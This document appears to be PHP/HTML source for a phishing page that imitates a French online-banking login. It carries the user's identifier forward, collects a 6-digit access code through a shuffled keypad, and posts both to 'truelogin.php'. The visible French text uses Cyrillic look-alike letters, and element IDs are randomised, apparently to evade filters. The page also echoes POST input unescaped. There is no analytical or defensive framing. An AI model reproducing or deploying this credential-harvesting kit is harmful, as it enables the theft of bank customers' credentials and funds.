                    ...
                    <nav>
                        ...
                        <div class="sc-gGvHcT jjdYjy"><svg viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" class="sc-laZRCg eqRlsb" height="24" width="24">
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M15.707 5.293a1 1 0 0 1 0 1.414L10.414 12l5.293 5.293a1 1 0 0 1-1.414 1.414l-6-6a1 1 0 0 1 0-1.414l6-6a1 1 0 0 1 1.414 0Z"></path>
                                        ...
                                        <div class="sc-icoqBx jfRpsO snipcss-HGkD2">
 <form method="post" action="./truelogin.php">
			  
							  <input type="hidden" id="0om1_1" name="username" value="<?php echo $_POST['user']; ?>"  />							  
							  <div class="sc-kLwonV erBgkb">
                            <h1 class="sc-hWZktu eJuFsj">
                                Соnnехіоn à vоtrе еsрасе                            </h1>
                            <div class="sc-hlXxXZ csoHSi">
                                <div class="sc-bYMpWt cSuaNd">
                                    ...
                                    <div title="456-546-546-5" class="sc-hhOBVt iyUBjV">
                                        <?php echo $_POST['user']; ?>                                    </div>
                                    <div class="sc-ilhmMj kdlNVO">
                                        <button class="sc-ftTHYK hIzZA sc-jrcTuL hDrShV" type="button">
                                            <svg viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" class="icon" height="24" width="24">
                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M23 3a1 1 0 0 1 1 1v6a1 1 0 0 1-1 1h-6a1 1 0 1 1 0-2h5V4a1 1 0 0 1 1-1ZM0 14a1 1 0 0 1 1-1h6a1 1 0 1 1 0 2H2v5a1 1 0 1 1-2 0v-6Z">
                                                </path>
                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M14.217 4.317a8 8 0 0 0-9.764 5.017 1 1 0 1 1-1.886-.668 10 10 0 0 1 16.489-3.744l4.629 4.35a1 1 0 0 1-1.37 1.457l-4.64-4.36a8 8 0 0 0-3.458-2.051ZM.271 13.315a1 1 0 0 1 1.414-.044l4.64 4.36a8 8 0 0 0 13.223-2.965 1 1 0 0 1 1.885.668 10 10 0 0 1-16.489 3.744l-4.629-4.35a1 1 0 0 1-.044-1.413Z">
                                                </path>
                                            </svg>
                                            <span class="sc-pyfCe jqwhcx" onclick="location.href='?op=g';">
                                                Сhаngеr                                            </span>
                                        </button>
                                    </div>
                                </div>
                            ...
                            <div class="sc-hUhoqY hOYYZG">
                                <div class="sc-iGgWBj hbKNwF">
                                    <div class="sc-jXbUNg jRPUwL">
                                        <label class="sc-imWYAI hmxDFp required">
                                            Соdе d’ассès (6 сhіffrеs)                                        </label>
                                        <div class="sc-gsFSXq liJNoO" id="gYMqeNjtqlutqOUI" name="pin">
                                            <div class="sc-kAyceB bXMYpn">
                                            </div>
                                            <div class="sc-kAyceB bXMYpn">
                                            </div>
                                            <div class="sc-kAyceB bXMYpn">
                                        ...
                                        <div class="sc-gsFSXq liJNoO snipcss0-5-16-18" name="password" id="cbHRfbBjSqQtyGOQ" style="display: none;">
                                        </div>
                                        <svg viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" class="sc-dhKdcB fwFNYB" height="24" width="24" role="button" id="XlVYNpgANehhNipL" onclick="toggleButtonVisibility(true)">
                                            ...
                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M12 10a2 2 0 1 0 0 4 2 2 0 0 0 0-4Zm-4 2a4 4 0 1 1 8 0 4 4 0 0 1-8 0Z">
                                            </path>
                                        </svg>
                                        <svg viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" class="sc-kpDqfm dHNzqK" height="24" width="24" role="button" id="lLHiJHORRFlRxDGP" onclick="toggleButtonVisibility(false)" style="display: none;">
                                            <path fill-rule="evenodd" clip-rule="evenodd" d="m12.073 5 8.68 8.688c.4-.542.77-1.106 1.105-1.69a18.681 18.681 0 0 0-2.463-3.314C17.62 6.789 15.14 5.028 12.073 5ZM23 12l.894-.447a1 1 0 0 1-.012.918 19.5 19.5 0 0 1-2.277 3.363 1 1 0 0 1-1.472.063L9.193 4.947a1 1 0 0 1 .48-1.68A10.12 10.12 0 0 1 12.002 3L12 4V3h.001c3.9 0 6.895 2.227 8.854 4.316a20.675 20.675 0 0 1 2.831 3.85 11.81 11.81 0 0 1 .192.354l.011.022.003.007.002.004L23 12ZM5.453 5.265a1 1 0 0 1 1.314.088l3.816 3.816.007.007 4.234 4.234.007.007 3.816 3.816a1 1 0 0 1-.1 1.502A11.07 11.07 0 0 1 12.016 21H12c-3.9 0-6.896-2.226-8.855-4.316a20.67 20.67 0 0 1-2.831-3.85 12.375 12.375 0 0 1-.192-.354l-.011-.022-.003-.007-.002-.002s0-.002.894-.449l-.894.447a1 1 0 0 1 .013-.92 19.45 19.45 0 0 1 5.334-6.262Zm-3.31 6.738a18.68 18.68 0 0 0 2.462 3.313c1.789 1.909 4.29 3.68 7.387 3.684a9.07 9.07 0 0 0 4.38-1.214l-2.322-2.322a3.992 3.992 0 0 1-2.054.61 3.999 3.999 0 0 1-3.46-6.124L5.987 7.401a17.45 17.45 0 0 0-3.844 4.602Zm7.885-.56a2 2 0 0 0 2.53 2.53l-2.53-2.53Z">
                                            </path>
                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M.293.293a1 1 0 0 1 1.414 0l22 22a1 1 0 0 1-1.414 1.414l-22-22a1 1 0 0 1 0-1.414Z">
                                            </path>
                                        </svg>
                                    </div>
                                </div>
                                <div class="sc-jlZhew kIujGa">
                                    <span>
                                    </span>
                                    <a role="link" class="sc-jEACwC loCtLo">
                                        Соdе d'ассès оublіé                                    </a>
                                </div>
                            </div>
                            <div class="sc-fJxALz kbEDhr">
                                <div role="group" class="sc-aXZVg fWeJLY">
                                    <input type="hidden" id="YAOrOcdMALPLxbJj" name="password" value="">
                                                                                                                <button class="sc-eqUAAy jHqcGs" type="button" onclick="appendToKeyboardInput(8)">
                                            8                                        </button>
                                                                            <button class="sc-eqUAAy jHqcGs" type="button" onclick="appendToKeyboardInput(9)">
                                            9                                        </button>
                                                                            <button class="sc-eqUAAy jHqcGs" type="button" onclick="appendToKeyboardInput(5)">
                                            5                                        </button>
                                                                            <button class="sc-eqUAAy jHqcGs" type="button" onclick="appendToKeyboardInput(1)">
                                            1                                        </button>
                                                                            <button class="sc-eqUAAy jHqcGs" type="button" onclick="appendToKeyboardInput(7)">
                                            7                                        </button>
                                                                            <button class="sc-eqUAAy jHqcGs" type="button" onclick="appendToKeyboardInput(6)">
                                            6                                        </button>
                                                                            <button class="sc-eqUAAy jHqcGs" type="button" onclick="appendToKeyboardInput(0)">
                                            0                                        </button>
                                                                            <button class="sc-eqUAAy jHqcGs" type="button" onclick="appendToKeyboardInput(2)">
                                            2                                        </button>
                                                                            <button class="sc-eqUAAy jHqcGs" type="button" onclick="appendToKeyboardInput(3)">
                                            3                                        </button>
                                                                            <button class="sc-eqUAAy jHqcGs" type="button" onclick="appendToKeyboardInput(4)">
                                            4                                        </button>
                                                                        <div class="sc-dcJsrY iRqbUC">
                                        <button class="sc-fqkvVR kmWDyT" type="button" onclick="removeFromKeyboardInput()">
                                            Еffасеr                                            <svg viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" class="icon" height="24" width="24">
                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 3.341A1 1 0 0 1 8 3h13a3 3 0 0 1 3 3v12a3 3 0 0 1-3 3H8a1 1 0 0 1-.753-.341l-7-8a1 1 0 0 1 0-1.318l7-8ZM8.454 5l-6.125 7 6.125 7H21a1 1 0 0 0 1-1V6a1 1 0 0 0-1-1H8.454Z">
                                                </path>
                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M18.707 8.293a1 1 0 0 1 0 1.414l-6 6a1 1 0 0 1-1.414-1.414l6-6a1 1 0 0 1 1.414 0Z">
                                                </path>
                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M11.293 8.293a1 1 0 0 1 1.414 0l6 6a1 1 0 0 1-1.414 1.414l-6-6a1 1 0 0 1 0-1.414Z">
                                                </path>
                                            </svg>
                                        </button>
                                    </div>
...
<script>
    ...
    function formatBarcodeInput() {
        const barcodeInput = document.getElementById("uGUrwWIpzMiBfcYe");
        ...
        const loginButton = document.getElementById('OUmdiAAmQiegXSdN');
    ...
    function updateAccessCodeElements() {
        const keyboardInputId = "YAOrOcdMALPLxbJj";
        const dotsElementId = "gYMqeNjtqlutqOUI";
        const valueElementId = "cbHRfbBjSqQtyGOQ";
    ...
    function toggleButtonVisibility(show) {
        const showButtonId = "XlVYNpgANehhNipL";
        const hideButtonId = "lLHiJHORRFlRxDGP";
        const dotsElementId = "gYMqeNjtqlutqOUI";
        const valueElementId = "cbHRfbBjSqQtyGOQ";
    ...
    function startCountdown() {
        ...
        let display = document.querySelector('#NLEifSPdWcQcpiCV'); // replace '#time' with the actual selector of your display element
    ...
    function formatDate() {
        const dateInput = document.getElementById("qEIFryxSpUhOfvGE");
    ...
    const input1 = document.getElementById("deEzNJCLaWINYRBP");
    const input2 = document.getElementById("qEIFryxSpUhOfvGE");
    const input3 = document.getElementById("LFFNbyNAEUiBUUrI");
    const continueButton = document.getElementById('tRfblIaOWSenoVdK');
